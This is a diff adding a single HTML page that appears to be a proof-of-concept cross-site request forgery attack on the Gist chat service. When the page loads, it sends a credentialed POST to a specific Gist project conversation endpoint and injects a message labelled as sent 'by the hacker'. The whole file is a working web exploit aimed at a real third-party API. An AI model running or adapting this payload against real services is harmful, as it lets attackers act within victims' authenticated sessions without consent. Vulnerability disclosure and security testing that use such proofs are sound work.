@@ -1,0 +1,32 @@
+<html>
+<script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+<body>
+<p id='success'></p>
+<p id='error'></p>
+<script>
+const random_number= Math.random().toString(36).substring(2);
+var today = new Date();
+var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+//	alert(random_number);
+var json={"message_content":`Hacked!! This message is sent by the hacker at ${time}`,"message_temp_id":`tumi3b4l-7f4b25ad-c250-fba2-8294-77ce99df894f-${random_number}`};
+$.ajax({
+    type: 'POST',
+	/* beforeSend: function(request) {
+    request.setRequestHeader("Authority", authorizationToken);
+	} */
+	contentType: 'application/json',
+    url: `https://web-api.getgist.com/api/v1/web/projects/tumi3b4l/conversations/tumi3b4l-7f4b25ad-c250-fba2-8294-77ce99df894f/message/user.json`,
+    crossDomain: true,
+    data: JSON.stringify(json),
+    dataType: 'application/json',
+	xhrFields: { withCredentials: true },		
+    success: function(responseData, textStatus, jqXHR) {
+          document.getElementById("success").innerHTML = "PLEASE RELOAD THE CONVERSATION WINDOW IN THE GIST SITE NOW";
+    },
+    error: function (responseData, textStatus, errorThrown) {
+       document.getElementById("success").innerHTML = "PLEASE RELOAD THE CONVERSATION WINDOW IN THE GIST SITE NOW";
+    }
+});
+</script>
+</body>
+</html>
